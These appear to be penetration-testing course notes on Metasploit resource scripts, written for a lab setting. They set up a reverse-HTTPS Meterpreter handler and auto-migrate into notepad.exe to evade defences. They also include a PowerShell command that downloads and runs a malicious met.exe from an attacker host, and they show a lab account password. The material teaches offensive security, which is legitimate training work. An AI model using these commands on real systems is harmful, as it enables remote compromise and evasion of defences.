- chain together a series of Metasploit console commands and Ruby code
- Example:
	- listener.rc
		- ```use exploit/multi/handler
			set PAYLOAD windows/meterpreter_reverse_https
			set LHOST 192.168.119.4
			set LPORT 443```
	- _AutoRunScript_ option
		- automatically execute a module after a session was created
			- use the _post/windows/manage/migrate_ module. This will cause the spawned Meterpreter to automatically launch a background _notepad.exe_ process and migrate to it
			- Automating process migration helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.
		- ```set AutoRunScript post/windows/manage/migrate ```
	- set _ExitOnSession_ to _false_
		- ensure that the listener keeps accepting new connections after a session is created.
		- ```set ExitOnSession false```
	- **show advanced**
		- We can also configure advanced options such as _ExitOnSession_ in multi/handler and _AutoRunScript_ in payloads by using **show advanced** within the activated module or selected payload.
	- Run in background
		- `run -z -j`
	- Run script
		- ```sudo msfconsole -r listener.rc```
	- initial setup for example
		- Let's connect to the BRUTE2 machine via RDP with user _justin_ and password _SuperS3cure1337#_, start PowerShell, download the malicious Windows executable **met.exe** that we already used in previous sections, and execute it.
		- `iwr -uri http://192.168.119.4/met.exe -Outfile met.exe`
		- `.\met.exe`
- Already provided scripts in **scripts/resource** from Metasploit
	- ```ls -l /usr/share/metasploit-framework/scripts/resource```